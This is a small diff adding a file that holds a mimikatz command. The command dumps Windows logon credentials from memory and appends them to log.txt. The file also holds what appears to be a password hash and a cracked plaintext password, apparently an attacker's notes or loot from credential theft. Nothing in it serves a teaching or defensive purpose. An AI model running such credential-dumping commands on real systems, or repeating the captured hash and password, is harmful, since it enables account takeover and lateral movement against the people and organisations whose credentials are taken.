@@ -1,0 +1,4 @@
+mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt
+
+ac554b19f88829f0cf14454ad7c3c3c1
+HUGE^GIS2
